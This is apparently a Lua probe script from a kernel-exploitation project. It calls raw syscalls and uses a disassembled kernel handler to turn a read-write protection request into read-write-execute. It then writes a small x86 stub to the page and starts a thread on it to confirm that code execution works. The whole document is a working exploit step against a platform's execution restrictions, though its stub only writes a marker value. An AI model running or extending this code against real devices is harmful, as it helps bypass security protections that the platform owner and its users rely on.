-- CRASH_CLASS: HIGH -- if the protection flip succeeds the probe starts a thread at the page. If it
-- does not succeed the thread start faults. Every step prints before it is taken.
-- PROBE 1496a: 548 op 2 turns a request for prot 6 into prot 7 - does that grant execution?
--
-- The op 2 case at 0xffffffff8b47c0b0 computes the protection it actually passes:
--     movzx edi, byte [rbp-0x80]      ; our byte
--     mov ecx, edi ; and ecx, 8 ; jne EINVAL      ; only bit 3 is refused
--     mov ecx, edi ; shr ecx,1 ; and ecx,0xffffffc1 ; or ecx,edi
--     call vm_map_protect(map, start, end, ecx, set_max=0)
-- so final = ((p>>1) & 0xffffffc1) | p, and p=6 (RW, no exec bit, passes the bit-3 gate) yields 7.
-- A request for 6 therefore asks the vm_map for RWX.
--
-- Every earlier exec test at this layer used a page whose max_prot was 3 (the mmap prot), so the
-- refusal was max_prot, not an exec filter: 1481g saw 4/5/6/7 all fail on a prot-3 mapping, and 1490a
-- saw every exec-only entry refuse a lower protection. Nobody has asked for p=6 on a page created
-- with mmap prot 7, whose max_prot is 7 and which therefore permits 7.
--
-- [A] mmap prot 7 (424a: this maps, and a jump to it faults) - 547 records the initial protection
-- [B] 548 op 2 -> 1, then -> 3, then -> 6, checking 547 after each: 547 reading 7 is the tell
-- [C] only if the page ends at 7: write a 14-byte stub and start it with thr_new(455)
-- [D] verdict, canary
--
-- -- prior art:
--   results/kernel_handlers/asm/sys_548.asm PART B (the op 2 transform)
--   docs/DEVICE_WINDOW_14_10.md section 7 (the measured protection matrix)
--   results/phase3_signals_codexec/424a..424c (mmap prot 5/7 maps, jump faults)
--   results/phase36_realargs/1481g_sys548_prot_full_matrix_20261109_202102.txt (4/5/6/7 refused on prot 3)
--   results/phase17_new_vectors/156d_thr_create_child_executes.lua / 56l (thr_new arg delivery)

print("=== PROBE 1496a: SYS 548 PROT 6 -> 7 ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sgn(v)
    local h, l = 0, N(v)
    if type(v) == "table" and v.h then h, l = N(v.h), N(v.l) end
    if (h % 4294967296) == 4294967295 and (l % 4294967296) == 4294967295 then return -1 end
    if h >= 0xFFFF8000 then return -1 end
    return h * 4294967296 + l
end
local function dw(a) return N(memory.read_dword(a)) end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end

local ent = memory.alloc(0x40)
local done = memory.alloc(0x10)
local rec = memory.alloc(0x40)

local function map547(addr)
    for i = 0, 0x3C, 4 do pcall(function() memory.write_dword(rec + i, uint64(0)) end) end
    local ok, rv = pcall(function()
        return N(mk(547)(uint64(string.format("0x%X", addr)), uint64(rec), uint64(0), uint64(0), uint64(0), uint64(0)))
    end)
    if not ok or rv ~= 0 then return -1 end
    return N(memory.read_dword(rec + 0x10))
end

local function protect(addr, len, prot)
    for i = 0, 0x38 do pcall(function() memory.write_byte(ent + i, 0) end) end
    pcall(function() memory.write_qword(ent + 0x00, uint64(string.format("0x%X", addr))) end)
    pcall(function() memory.write_qword(ent + 0x10, uint64(string.format("0x%X", len))) end)
    pcall(function() memory.write_dword(ent + 0x18, uint64(prot)) end)
    pcall(function() memory.write_byte(ent + 0x1C, 2) end)
    pcall(function() memory.write_dword(done, uint64(0xEEEEEEEE)) end)
    local ok, rv = pcall(function()
        return N(mk(548)(uint64(0), uint64(0), uint64(ent), uint64(1), uint64(done), uint64(0)))
    end)
    if not ok then return "EXC", 0 end
    return rv, N(memory.read_dword(done))
end

-- ---------------------------------------------------------------- [A]
print("")
print("--- [A] mmap with prot 7 (max_prot 7) ---")
local P = -1
do
    local ok, v = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(7), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then P = sgn(v) end
end
print(string.format("  mmap prot7 -> 0x%X %s", P, P < 0 and es() or ""))
if P < 0x10000 then
    print("  could not map with prot 7; stopping")
    print("=== PROBE 1496a INCOMPLETE ===")
    return
end
print(string.format("  547 prot = %d", map547(P)))

-- ---------------------------------------------------------------- [B]
print("")
print("--- [B] 548 op 2 walk: 1, 3, then 6 ---")
-- final = ((p>>1) & 0xffffffc1) | p, worked out on paper: Lua 5.1 has no bitwise operators
local FINAL = {[1] = 1, [3] = 3, [6] = 7}
local steps = {1, 3, 6}
for _, p in ipairs(steps) do
    local rv, pr = protect(P, 0x4000, p)
    print(string.format("  request %d -> final 0x%02X : rv=%-4s processed=%d  547 now %d  %s",
        p, FINAL[p], tostring(rv), pr, map547(P),
        rv == -1 and es() or ""))
end
local finalprot = map547(P)
local got_exec = finalprot == 7
print(string.format("  final protection %d, exec bit set: %s", finalprot, tostring(got_exec)))

-- ---------------------------------------------------------------- [C]
print("")
print("--- [C] write a stub and start it ---")
if finalprot ~= 7 then
    print("  the vm_map did not end at 7, so there is nothing to execute; skipping [C]")
else
    local STUB = {0xB8, 0x44, 0x43, 0x42, 0x41,   -- mov eax,0x41424344
                  0x89, 0x07,                     -- mov [rdi],eax
                  0xC7, 0x47, 0x08, 0x2A, 0x00, 0x00, 0x00, -- mov dword [rdi+8],0x2A
                  0xC3}                           -- ret
    for i, b in ipairs(STUB) do
        pcall(function() memory.write_byte(P + i - 1, b) end)
    end
    print(string.format("  wrote %d stub bytes; first dword reads %08X", #STUB, dw(P)))

    local marker = -1
    do
        local ok, v = pcall(function()
            return mk(477)(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)
        if ok then marker = sgn(v) end
    end
    local stack = -1
    do
        local ok, v = pcall(function()
            return mk(477)(uint64(0), uint64(0x10000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)
        if ok then stack = sgn(v) end
    end
    pcall(function() memory.write_dword(marker, uint64(0x11111111)) end)
    pcall(function() memory.write_dword(marker + 8, uint64(0x22222222)) end)
    print(string.format("  marker 0x%X stack 0x%X", marker, stack))

    if marker > 0x10000 and stack > 0x10000 then
        local prm = memory.alloc(0x38)
        for i = 0, 0x30, 8 do pcall(function() memory.write_qword(prm + i, uint64(0)) end) end
        pcall(function() memory.write_qword(prm + 0x00, uint64(string.format("0x%X", P))) end)
        pcall(function() memory.write_qword(prm + 0x08, uint64(string.format("0x%X", marker))) end)
        pcall(function() memory.write_qword(prm + 0x10, uint64(string.format("0x%X", stack))) end)
        pcall(function() memory.write_qword(prm + 0x18, uint64(0x10000)) end)
        print("  calling thr_new(455) with start_func = the page ...")
        local ok, rv = pcall(function()
            return N(mk(455)(uint64(prm), uint64(0x38), uint64(0), uint64(0), uint64(0), uint64(0)))
        end)
        print(string.format("  thr_new rv=%s %s", ok and tostring(rv) or "EXC", (ok and rv == -1) and es() or ""))
        local ts = memory.alloc(16)
        pcall(function() memory.write_qword(ts, uint64(0)) end)
        pcall(function() memory.write_qword(ts + 8, uint64(200000000)) end)
        pcall(function() mk(240)(uint64(ts), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
        local m0, m8 = nil, nil
        pcall(function() m0 = dw(marker) end)
        pcall(function() m8 = dw(marker + 8) end)
        print(string.format("  marker after 200 ms: [0]=%s [8]=%s",
            m0 and string.format("%08X", m0) or "fault", m8 and string.format("%08X", m8) or "fault"))
        if m0 == 0x41424344 then
            print("  *** THE STUB EXECUTED: prot 6 -> 7 grants execution ***")
        else
            print("  the stub did not execute")
        end
    end
end

-- ---------------------------------------------------------------- [D]
print("")
local final = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("final canary live: %s (pid %d)", tostring(final == PID), PID))
print("=== PROBE 1496a COMPLETE ===")
